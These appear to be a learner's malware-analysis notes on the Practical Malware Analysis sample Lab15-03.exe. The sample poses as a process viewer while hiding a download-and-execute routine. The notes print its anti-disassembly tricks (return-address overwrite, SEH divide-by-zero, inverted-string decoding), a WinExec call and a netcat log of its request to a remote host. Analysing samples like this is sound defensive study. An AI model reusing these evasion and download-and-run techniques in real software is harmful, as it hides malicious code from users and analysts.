Lab15-03.exe
    PE Analysis
        # Virustotal
            47/72
            SHA-256: b2a6e13fab9d8fa32acbfaa346f2987c35f7d7c0ba7547aa8524b20cde63773b

            PEiD packer
                Microsoft Visual C++

            TimeStamp: 2011-02-05 05:40:38

            Subsystem: Windows CUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	1756	4096	3.05	462d1769ea62193412a2f67d53bbe830
                .rdata	8192	842	4096	1.38	a927f256bdaf6cb2a5f47501b75e7f73
                .data	12288	1036	4096	1.88	0a91a8fa1d9023b034d47336117097b4

            IMPORT
                KERNEL32.dll
                    CreateToolhelp32Snapshot
                    GetLastError
                    GetPriorityClass
                    WinExec                         // !
                    Process32First
                    OpenProcess
                    Module32Next
                    Module32First
                    ExitProcess
                    CloseHandle
                    Thread32Next
                    Thread32First
                    Process32Next
                    FormatMessageA
                MSVCRT.dll
                urlmon.dll
                    URLDownloadToFileA

        # strings.exe (Only part of the results)
            TalonTech Consulting LLC.
            **************************
            Process Viewer v1.3
            CreateToolhelp32Snapshot (of processes)
            Process32First
            =====================================================
            PROCESS NAME:  %s
            -------------------------------------------------------
            OpenProcess
            GetPriorityClass
            Process ID        = 0x%08X
            Thread count      = %d
            Parent process ID = 0x%08X
            Priority base     = %d
            Priority class    = %d
            CreateToolhelp32Snapshot (of modules)
            Module32First
                MODULE NAME:     %s
                Executable     = %s
                Process ID     = 0x%08X
                Ref count (g)  = 0x%04X
                Ref count (p)  = 0x%04X
                Base address   = 0x%08X
                Base size      = %d
            Thread32First
                THREAD ID      = 0x%08X
                Base priority  = %d
                Delta priority = %d
            WARNING: %s failed with error %d (%s)
            For more information please visit our website.

    Dynamic Analysis
        It seems print out all of information of current processes and their modules.

        # RegShot (Part of results)
            Nothing valuable

        # procexp
            NULL

        # procmon
            NULL

        # autoruns
            NULL

        # ApateDNS
            www.practicalmalwareanalysis.com

        # Netcat
            $ sudo nc -lvvp 80
            Listening on [0.0.0.0] (family 0, port 80)
            Connection from [10.0.0.2] port 80 [tcp/http] accepted (family 2, sport 1183)
            GET /tt.html HTTP/1.1
            Accept: */*
            Accept-Encoding: gzip, deflate
            User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)
            Host: www.practicalmalwareanalysis.com
            Connection: Keep-Alive

        # sc
            NULL

        # IDA Pro
            The main probably dela with info of processes and modules.

            .text:0040100C                 mov     eax, 400000h
            .text:00401011                 or      eax, 148Ch
            .text:00401016                 mov     [ebp+4], eax                 // Ctrl+K <- view stack of main, It overwrite the retn addr as 0x40148C

            D and C on red code in the IDA view window.

            .text:00401497 010                 push    offset sub_4014C0
            .text:0040149C 014                 push    large dword ptr fs:0
            .text:004014A3 018                 mov     large fs:0, esp
            .text:004014AA 018                 xor     ecx, ecx
            .text:004014AC 018                 div     ecx
            .text:004014AE 018                 push    offset aForMoreInforma ; "For more information please visit our w"...
            .text:004014B3 01C                 call    printf               // div 0?

            sub_4014C0
            .text:004014E6 00C                 push    offset asc_403010 ; "—"
            .text:004014EB 010                 call    sub_401534
            .text:004014F0 010                 add     esp, 4
            .text:004014F3 00C                 push    offset CmdLine
            .text:004014F8 010                 call    sub_401534

            _BYTE *__cdecl sub_401534(_BYTE *a1)
            {
            _BYTE *result; // eax

            while ( 1 )
            {
                result = a1;
                if ( !*a1 )
                break;
                *a1 = ~*a1;
                ++a1;
            }
            return result;
            }

            .text:004014E6 00C                 push    offset asc_403010 ; "—"              // Need to be decrypted (each_char^0xFF)
            .text:004014EB 010                 call    sub_401534
            .text:004014F0 010                 add     esp, 4
            .text:004014F3 00C                 push    offset CmdLine                       // Need to be decrypted
            .text:004014F8 010                 call    sub_401534
            
            CmdLine will be executed at last
            .text:0040151C 010                 push    offset CmdLine  ; lpCmdLine
            .text:00401521 014                 call    ds:WinExec
